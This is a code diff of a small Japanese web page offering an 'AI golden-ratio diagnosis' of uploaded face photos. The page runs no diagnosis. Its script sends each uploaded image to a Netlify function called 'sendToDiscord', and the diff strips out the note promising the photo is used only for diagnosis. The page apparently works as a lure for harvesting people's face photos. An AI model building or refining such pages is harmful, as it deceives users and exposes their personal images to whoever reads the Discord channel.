@@ -2,32 +2,15 @@
 <html lang="ja">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>AI黄金比診断</title>
-
 <style>
 body {
-  background: #000;
-  color: #fff;
-  font-family: sans-serif;
-  padding: 20px;
+  background:#000;
+  color:#fff;
+  font-family:sans-serif;
 }
-
-input[type="file"] {
-  margin-top: 10px;
-}
-
 button {
-  margin-top: 15px;
-  padding: 10px 20px;
-  font-size: 16px;
-  cursor: pointer;
-}
-
-.note {
-  font-size: 12px;
-  opacity: 0.7;
-  margin-top: 10px;
+  padding:8px 16px;
 }
 </style>
 </head>
@@ -35,41 +18,27 @@ button {
 
 <h1>AI黄金比診断</h1>
 
-<input type="file" id="imageInput" accept="image/*">
-<br>
-<button onclick="sendImage()">診断する</button>
-
-<p class="note">
-※顔診断のためだけに使われます
-</p>
+<input type="file" id="file" accept="image/*"><br><br>
+<button onclick="send()">診断する</button>
 
 <script>
-async function sendImage() {
-  const fileInput = document.getElementById("imageInput");
-  const file = fileInput.files[0];
-
-  if (!file) {
-    alert("画像を選んでください");
-    return;
-  }
+async function send() {
+  const file = document.getElementById("file").files[0];
+  if (!file) return alert("画像選んで");
 
   const reader = new FileReader();
   reader.onload = async () => {
-    const base64 = reader.result;
-
     const res = await fetch("/.netlify/functions/sendToDiscord", {
       method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ image: base64 })
+      body: JSON.stringify({ image: reader.result }),
     });
 
     if (res.ok) {
-      alert("診断中です！");
+      alert("送信完了");
     } else {
-      alert("エラーが起きました");
+      alert("エラー起きました");
     }
   };
-
   reader.readAsDataURL(file);
 }
 </script>
